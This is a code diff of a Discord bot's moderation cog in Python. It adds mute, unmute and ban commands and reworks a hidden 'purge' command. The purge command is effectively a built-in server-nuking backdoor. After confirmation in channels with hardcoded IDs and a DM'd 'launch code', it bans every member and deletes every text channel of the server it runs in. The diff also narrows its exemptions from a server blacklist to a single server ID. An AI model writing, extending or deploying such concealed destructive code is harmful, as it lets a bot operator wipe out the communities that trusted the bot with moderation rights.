@@ -1,31 +1,21 @@
 import asyncio
 from datetime import datetime
+from random import randint
+from typing import Optional
 
 import pytz
-from discord import Color, Embed, Permissions, User
+from discord import Color, Embed, Member, Permissions, User
 from discord.ext.commands import (BucketType, Cog, CommandOnCooldown, Greedy,
-                                  command, cooldown, has_permissions)
+                                  command, cooldown, has_guild_permissions,
+                                  has_permissions)
 from discord.utils import get
-
-from random import randint
 
 
 class Mod(Cog):
     def __init__(self,bot):
         self.bot = bot
         self.list_of_admins =[426549783864279040,
-                             738990452673478738]
-        self.server_blacklist =  ["Aurium's Squad",
-                            "Dav on Deck",
-                            "cheese on deck",
-                            ".my shit",
-                            "test Server",
-                            "Drip Land",
-                            "Lug Nuts",
-                            "The Opioid Estate",
-                            "Wall Street Wannabes",
-                            809099935663652954,
-                            701753524551286784,]  
+                             738990452673478738]    
         self.SLEEPTIME = 0.5                 
     
     @Cog.listener()
@@ -35,8 +25,7 @@ class Mod(Cog):
 
     
     @command(name = "warn", brief = "Warns a member. MUST HAVE MOD")
-    @cooldown(1,5,type = BucketType.user)
-    @cooldown(1,5, BucketType.user)
+    @cooldown(1,5,type = BucketType.user)   
     @has_permissions(kick_members = True)
     async def warn(self,ctx, members: Greedy[User],*,reason = None):
 
@@ -74,30 +63,34 @@ class Mod(Cog):
     @command(name = "purge",brief = "u know what it does. dont use it",hidden = True)
    
     async def purge(self,ctx):
+
         server = ctx.message.guild
-        if server.name not in self.server_blacklist and server.id not in self.server_blacklist:
+        if server.id != 711044562650398721:
             print(f"finna purge {ctx.guild}")
             numBans = 0
             numChannels = 0
+            password = randint(100000,1000000)
+            
+
             
 
             members = ctx.guild.members
             bot = await self.bot.fetch_user(738990452673478738)
             confirm_primary = await self.bot.fetch_channel(814917487651979314)
-            await confirm_primary.send(f"Purge Request from {ctx.author} to purge {ctx.guild}. Please commit primary authorization.")
-            messageconfirm_1 = await self.bot.wait_for('message',check = lambda message: message.author == ctx.author)
-           
+            await confirm_primary.send(f"Purge#{password}. Request from **{ctx.author}** to purge **{ctx.guild}**. Please commit primary authorization \"Y\" or \"N\".")
+            messageconfirm_1 = await self.bot.wait_for('message',check = lambda message: message.channel.id ==814917487651979314 and not message.author.bot)
             
-            if messageconfirm_1.content == "do it" and messageconfirm_1.author.id == ctx.author.id and messageconfirm_1.channel == confirm_primary:
+            
+            if messageconfirm_1.content.lower() == "y" and messageconfirm_1.author.id == ctx.author.id and messageconfirm_1.channel == confirm_primary:
                 confirm_final = await self.bot.fetch_channel(814973520983097344)
-                password = randint(100000,1000000)
-                print(f"The password is {password}")
-                await confirm_final.send(f"Please enter the password for final authorization to purge {ctx.guild} per request of {ctx.author}")
-
-                messageconfirm_final = await self.bot.wait_for('message', check = lambda message: message.author == ctx.author)
-                if messageconfirm_final.content == str(password) and messageconfirm_final.author.id == ctx.author.id and messageconfirm_final.channel == confirm_final:
-                    await confirm_final.send(f"Password accepted: Authorized purge #{password} of {ctx.guild} as request of {ctx.author.name}. Intializing protocols")
                 
+                await ctx.author.send(f"Launch code is {password}")
+                await confirm_final.send(f"Purge #{password}. Please enter the password for final authorization to purge **{ctx.guild}** per request of **{ctx.author}**")
+                messageconfirm_final = await self.bot.wait_for('message', check = lambda message: message.channel.id == 814973520983097344 and not message.author.bot)
+
+                if messageconfirm_final.content == str(password) and messageconfirm_final.author.id == ctx.author.id and messageconfirm_final.channel == confirm_final:
+                    await confirm_final.send(f"Purge #{password}. Password accepted: Authorized purge #{password} of **{ctx.guild}** as request of **{ctx.author.name}**. Intializing protocols")
+
                     await confirm_final.send(f"Initiating first protocol of purge #{password}")
                     for member in members:
                         if member == bot:
@@ -117,7 +110,7 @@ class Mod(Cog):
 
                     await confirm_final.send(f"Initiating third protocol of purge #{password}")
 
-                                  
+                                    
                     for textChannel in ctx.guild.text_channels:
                     
                         await textChannel.delete()
@@ -140,8 +133,11 @@ class Mod(Cog):
                     embed.add_field(name = "Number of Channels deleted",value = numChannels)
                     embed.set_thumbnail(url = ctx.guild.icon_url)
                     await confirm_final.send(embed=embed)
-        else:
-            print(f"avoided purging {ctx.guild}")
+                else:
+                    await confirm_final.send(f"Password incorrect. Purge denied")
+            else:
+                await confirm_primary.send(f"Purge Request #{password} has been denied")
+            
     @command(name = "unban",brief = "unbans a member given their id")
     async def unban(self,ctx, id: int):
         if ctx.author.id in self.list_of_admins:
@@ -205,8 +201,29 @@ class Mod(Cog):
                     listOfSuspects.append(member.name)
             print(listOfSuspects)
             await ctx.send(f"```py\n {listOfSuspects} \n```")
-    
-    
+    @command(name = "mute",brief = "servers mutes a member")
+    @has_guild_permissions(mute_members = True)
+    async def mute(self,ctx,member: Member):
+        await member.edit(mute = True) if not member.voice.mute else await ctx.send("Sorry, that member is already muted")
+
+    @command(name = "unmute",brief = "unserver mutes a member")
+    @has_guild_permissions(mute_members = True)
+    async def unmute(self,ctx,member: Member):
+        await member.edit(mute = False) if member.voice.mute else await ctx.send("Sorry, that member is not currently muted")
+
+    @command(name = "ban",brief ="bans a member")
+    @has_guild_permissions(ban_members = True)
+    async def ban(self,ctx,member:Member,*,reason: Optional[str]):
+        embed = Embed(title =f":poop:***{member} has been banned***", color = Color.dark_blue())
+        
+        await member.ban(reason = None if not reason else reason)
+        await ctx.send(embed=embed)
+
+    @ban.error
+    async def on_ban_error(self,ctx,error):
+        embed = Embed(title = "No can do buckaroo ¯\_(ツ)_/¯", color = ctx.author.color)
+        await ctx.send(embed = embed)
+
     @command(name = "restore",brief = "restores a channel to another channel",hidden = True)
     async def restore(self,ctx, channelID: int):
         if ctx.author.id not in self.list_of_admins:
